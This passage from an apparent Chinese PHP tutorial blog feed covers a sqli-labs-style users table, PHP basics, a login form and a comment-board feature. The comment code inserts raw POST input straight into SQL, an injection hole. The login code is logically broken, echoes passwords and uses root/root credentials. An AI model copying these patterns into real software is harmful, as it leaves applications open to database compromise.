class="number">9</span>, <span class="string">&#x27;admin1&#x27;</span>, <span class="string">&#x27;admin1&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">10</span>, <span class="string">&#x27;admin2&#x27;</span>, <span class="string">&#x27;admin2&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">11</span>, <span class="string">&#x27;admin3&#x27;</span>, <span class="string">&#x27;admin3&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">12</span>, <span class="string">&#x27;dhakkan&#x27;</span>, <span class="string">&#x27;dumbo&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `users` <span class="keyword">VALUES</span> (<span class="number">14</span>, <span class="string">&#x27;admin4&#x27;</span>, <span class="string">&#x27;admin4&#x27;</span>);</span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h3 id="7-搜寻完成后，则在”security“数据库中新增了四张表，如图所示即为成功。"><a href="#7-搜寻完成后，则在”security“数据库中新增了四张表，如图所示即为成功。" class="headerlink" title="7.搜寻完成后，则在”security“数据库中新增了四张表，如图所示即为成功。"></a>7.搜寻完成后，则在”security“数据库中新增了四张表，如图所示即为成功。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212203226780.png" alt="image-20231212203226780"></p><h2 id="php的简单语法"><a href="#php的简单语法" class="headerlink" title="php的简单语法"></a>php的简单语法</h2><ol><li><h3 id="php基本语法"><a href="#php基本语法" class="headerlink" title="php基本语法"></a>php基本语法</h3></li></ol><p>PHP 脚本可以放在文档中的任何位置。</p><p>PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// PHP 代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> PHP 是弱类型语言，对 PHP 变量进行比较，包含松散和严格比较。</p><ul><li>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</li><li>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="number">42</span> == <span class="string">&quot;42&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;1、值相等&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> PHP_EOL; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="number">42</span> === <span class="string">&quot;42&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;2、类型相等&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;3、类型不相等&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li><h3 id="用php计算鸡兔同笼问题"><a href="#用php计算鸡兔同笼问题" class="headerlink" title="用php计算鸡兔同笼问题"></a>用php计算鸡兔同笼问题</h3></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span> = <span class="number">0</span>;<span class="variable">$a</span> &lt;=<span class="number">8</span>;<span class="variable">$a</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$b</span> = <span class="number">0</span>;<span class="variable">$b</span> &lt;=<span class="number">8</span>;<span class="variable">$b</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$a</span>+<span class="variable">$b</span>==<span class="number">8</span> &amp;&amp; <span class="variable">$a</span>*<span class="number">4</span> + <span class="variable">$b</span>*<span class="number">2</span> ==<span class="number">22</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><h3 id="用php计算组合问题"><a href="#用php计算组合问题" class="headerlink" title="用php计算组合问题"></a>用php计算组合问题</h3></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$n</span> = <span class="number">0</span>;<span class="variable">$n</span>&lt;=<span class="number">156</span>/<span class="number">0.5</span>;<span class="variable">$n</span>++)&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$y</span> = <span class="number">0</span>;<span class="variable">$y</span>&lt;=<span class="number">156</span>/<span class="number">1</span>;<span class="variable">$y</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$z</span> = <span class="number">0</span>;<span class="variable">$z</span>&lt;=<span class="number">156</span>/<span class="number">10</span>;<span class="variable">$z</span>++)&#123;</span><br><span class="line">      <span class="keyword">for</span>(<span class="variable">$t</span> = <span class="number">0</span>;<span class="variable">$t</span>&lt;=<span class="number">156</span>/<span class="number">50</span>;<span class="variable">$t</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$x</span> = <span class="number">0</span>;<span class="variable">$x</span>&lt;=<span class="number">156</span>/<span class="number">100</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">          <span class="keyword">if</span>(<span class="variable">$n</span>*<span class="number">0.5</span> + <span class="variable">$y</span>*<span class="number">1</span> + <span class="variable">$z</span>*<span class="number">10</span> + <span class="variable">$t</span>*<span class="number">50</span> + <span class="variable">$x</span>*<span class="number">100</span> == <span class="number">156</span>)&#123;</span><br><span class="line">            <span class="variable">$zz</span>++;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">&#125; <span class="keyword">echo</span> <span class="variable">$zz</span>;</span><br><span class="line"><span class="meta">?&gt;</span> --&gt;</span><br></pre></td></tr></table></figure><h2 id="php的简单交互"><a href="#php的简单交互" class="headerlink" title="php的简单交互"></a>php的简单交互</h2><h3 id="1-将“phpstudy”软件“navicat”软件打开并运行。"><a href="#1-将“phpstudy”软件“navicat”软件打开并运行。" class="headerlink" title="1.将“phpstudy”软件“navicat”软件打开并运行。"></a>1.将“phpstudy”软件“navicat”软件打开并运行。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212204502251.png" alt="image-20231212204502251"></p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212204516589.png" alt="image-20231212204516589"></p><h3 id="2-在“phpstudy”中打开”根目录“，并创建”index-php“和”link-php”文件。"><a href="#2-在“phpstudy”中打开”根目录“，并创建”index-php“和”link-php”文件。" class="headerlink" title="2.在“phpstudy”中打开”根目录“，并创建”index.php“和”link.php”文件。"></a>2.在“phpstudy”中打开”根目录“，并创建”index.php“和”link.php”文件。</h3><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212204601863.png" alt="image-20231212204601863"></p><h3 id="3-编辑”index-php“和”link-php”文件，代码如下："><a href="#3-编辑”index-php“和”link-php”文件，代码如下：" class="headerlink" title="3.编辑”index.php“和”link.php”文件，代码如下："></a>3.编辑”index.php“和”link.php”文件，代码如下：</h3><h4 id="”index-php“代码（HTML登录界面）"><a href="#”index-php“代码（HTML登录界面）" class="headerlink" title="”index.php“代码（HTML登录界面）"></a>”index.php“代码（HTML登录界面）</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;link.php&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;remeber&quot;</span> <span class="attr">value</span>=<span class="string">&quot;yes&quot;</span>&gt;</span>记住密码<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;reset&quot;</span> <span class="attr">value</span>=<span class="string">&quot;重置&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="link-php”文件代码（网站后台php程序文件），具体代码如下："><a href="#link-php”文件代码（网站后台php程序文件），具体代码如下：" class="headerlink" title="link.php”文件代码（网站后台php程序文件），具体代码如下："></a>link.php”文件代码（<strong>网站后台php程序文件</strong>），具体代码如下：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=UTF-8&#x27;</span>);</span><br><span class="line"><span class="variable">$u</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="variable">$p</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;security&quot;</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;Error connecting&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=? AND password=?&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="title function_ invoke__">mysqli_prepare</span>(<span class="variable">$link</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_bind_param</span>(<span class="variable">$stmt</span>, <span class="string">&quot;ss&quot;</span>, <span class="variable">$u</span>, <span class="variable">$p</span>);</span><br><span class="line"><span class="title function_ invoke__">mysqli_stmt_execute</span>(<span class="variable">$stmt</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="string">&quot;set names utf8&quot;</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your login name is &#x27;</span> . <span class="variable">$u</span> . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your password is &#x27;</span> . <span class="variable">$p</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="具体代码解释（对于不了解的函数详解）："><a href="#具体代码解释（对于不了解的函数详解）：" class="headerlink" title="具体代码解释（对于不了解的函数详解）："></a>具体代码解释（对于不了解的函数详解）：</h3><h4 id="”index-php“代码解释："><a href="#”index-php“代码解释：" class="headerlink" title="”index.php“代码解释："></a>”index.php“代码解释：</h4><ol><li><code>&lt;form method=&quot;post&quot; action=&quot;link.php&quot;&gt;</code>：这是表单的开始标签。<ul><li><strong><code>method=&quot;post&quot;</code> 表示表单数据将通过HTTP POST方法发送。这种方法通常用于提交敏感信息，因为数据不会显示在URL中。</strong></li><li><code>action=&quot;link.php&quot;</code> 指定当表单提交时，数据将发送到同一服务器上的”link.php”文件进行处理。</li></ul></li><li><code>&lt;input type=&quot;checkbox&quot; name=&quot;remember&quot; value=&quot;yes&quot;&gt;记住密码</code>：这是一个复选框，允许用户选择是否“记住密码”。如果选中，提交表单时，将发送“remember&#x3D;yes”。</li><li><code>&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</code>：这是一个提交按钮。点击这个按钮会将表单数据发送到指定的action URL<strong>（本例中为”link.php”）</strong>。</li></ol><p>link.php”文件代码解释：</p><ol><li><p><code>$u = trim($_POST[&#39;username&#39;]);</code> 和 <code>$p = trim($_POST[&#39;password&#39;]);</code>：这两行代码从<code>$_POST</code>数组中获取<code>username</code>和<code>password</code>字段的值。</p></li><li><p><code>mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;)</code>：此函数尝试建立与MySQL数据库的新连接。</p></li><li><p><code>mysqli_query($link,&quot;set names utf8&quot;);</code>：这行代码设置数据库连接的字符集为UTF-8。</p></li><li><p><code>$sql = &quot;SELECT * FROM users WHERE username=? AND password=?&quot;;</code>：这是一个带有占位符的SQL查询语句。</p></li><li><p><code>mysqli_stmt_execute($stmt);</code>：执行准备好的语句。</p></li><li><p><code>echo &#39;Your login name is &#39; . $u . &quot;&lt;br /&gt;&quot;;</code> 和 <code>echo &#39;Your password is &#39; . $p;</code>：这两行代码输出了之前获取的用户名和密码。</p></li></ol><h4 id="具体函数解释："><a href="#具体函数解释：" class="headerlink" title="具体函数解释："></a>具体函数解释：</h4><ol><li><p><code>trim</code>函数用于移除字符串两端的空白字符（如空格、制表符、换行符等）。</p></li><li><p><code>mysqli_connect</code>函数用于打开新的数据库连接。（如：<code>$link = mysqli_connect(&quot;127.0.0.1&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;);</code> 连接到位于<code>127.0.0.1</code>的MySQL服务器，用户名和密码均为<code>root</code>，数据库名为<code>security</code>。）</p></li><li><p><code>mysqli_query</code>函数用于执行SQL查询。</p></li><li><p><code>mysqli_prepare</code>函数用于准备一个SQL语句以绑定参数并执行。</p></li><li><p><code>mysqli_stmt_bind_param</code>函数用于绑定变量到一个预处理语句作为参数。</p></li><li><p><code>mysqli_stmt_execute</code>函数用于执行预处理的语句。</p></li><li><p><code>mysqli_fetch_array</code>函数用于从结果集中取得一行作为关联数组，或数字数组，或两者兼有。</p></li></ol><h4 id="执行结果如下："><a href="#执行结果如下：" class="headerlink" title="执行结果如下："></a>执行结果如下：</h4><p>1.在“用户名”中输入“lishujun”，在“密码”中输入“123456”，点击提交后则跳转至“link.php”</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212211231147.png" alt="image-20231212211231147"></p><p>2.提交后得到数据如下</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231212211345748.png" alt="image-20231212211345748"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php的基本认识&quot;&gt;&lt;a href=&quot;#php的基本认识&quot; class=&quot;headerlink&quot; title=&quot;php的基本认识&quot;&gt;&lt;/a&gt;php的基本认识&lt;/h1&gt;&lt;h2 id=&quot;前期准备&quot;&gt;&lt;a href=&quot;#前期准备&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
    <category term="1" scheme="http://example.com/tags/1/"/>
    
  </entry>
  
  <entry>
    <title>php的网页制作</title>
    <link href="http://example.com/2023/12/13/php%E7%BD%91%E9%A1%B5/"/>
    <id>http://example.com/2023/12/13/php%E7%BD%91%E9%A1%B5/</id>
    <published>2023-12-13T12:01:41.202Z</published>
    <updated>2023-12-17T01:46:09.117Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php的网页制作"><a href="#php的网页制作" class="headerlink" title="php的网页制作"></a>php的网页制作</h1><h2 id="评论区上传功能"><a href="#评论区上传功能" class="headerlink" title="评论区上传功能"></a>评论区上传功能</h2><h3 id="在编写php代码之前，需要建立一个表单，用来存放输入的评论。"><a href="#在编写php代码之前，需要建立一个表单，用来存放输入的评论。" class="headerlink" title="在编写php代码之前，需要建立一个表单，用来存放输入的评论。"></a>在编写php代码之前，需要建立一个表单，用来存放输入的评论。</h3><p>1.打开”navicat“，打开“security”数据库，并且右击表，点击“新建表”。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231213201751192.png" alt="image-20231213201751192"></p><p>2.建立新的两列，为“id”，以及“comment”。“id”列的类型为“int”，“comment”列的类型为“varchar”，并且勾选“自动递增”。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231213202625116.png" alt="image-20231213202625116"></p><p>3.点击保存后，输入表名为“comments”，点击确定。</p><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231213202803437.png" alt="image-20231213202803437"></p><p>4.随后编辑代码，先将基础的评论区以及提交按钮完成，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;comment&quot;</span>&gt;</span>发表评论<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;comment&quot;</span> <span class="attr">id</span>=<span class="string">&quot;comment&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;80&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交评论&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Lijunjun575/tu/main/img/image-20231217090205509.png" alt="image-20231217090205509"></p><p>5.编辑php代码，将评论内容添加至新建数据库中，代码以及注释如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 处理用户提交的评论</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">// 检查是否有 &#x27;comment&#x27; 字段并且不为空</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$comment</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]; <span class="comment">// 获取评论内容</span></span><br><span class="line">            <span class="comment">// 连接到数据库</span></span><br><span class="line">            <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;security&quot;</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;数据库连接失败！&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;set names utf8&quot;</span>); <span class="comment">// 设置字符集</span></span><br><span class="line">            <span class="comment">// 构造 SQL 插入语句</span></span><br><span class="line">            <span class="variable">$ChaRu</span> = <span class="string">&quot;insert INTO comments (comment) VALUES(&#x27;<span class="subst">$comment</span>&#x27;)&quot;</span>;</span><br><span class="line">            <span class="comment">// 执行 SQL 语句并检查是否成功</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$ChaRu</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;你的评论已成功保存到数据库。&lt;/p&gt;&quot;</span>; <span class="comment">// 成功消息</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;p style=&#x27;color: red;&#x27;&gt;保存评论时出错。&lt;/p&gt;&quot;</span>; <span class="comment">// 错误消息</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$link</span>); <span class="comment">// 关闭数据库连接</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// 显示最近的 20 条评论</span></span><br><span class="line">    <span class="variable">$link</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;security&quot;</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">&quot;数据库连接失败！&quot;</span>); <span class="comment">// 再次连接到数据库</span></span><br><span class="line">    <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="string">&quot;set names utf8&quot;</span>); <span class="comment">// 设置字符集</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询最新的 20 条评论</span></span><br><span class="line">    <span class="variable">$query</span> = <span class="string">&quot;SELECT * FROM comments ORDER BY id DESC LIMIT 20&quot;</span>;    </span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ 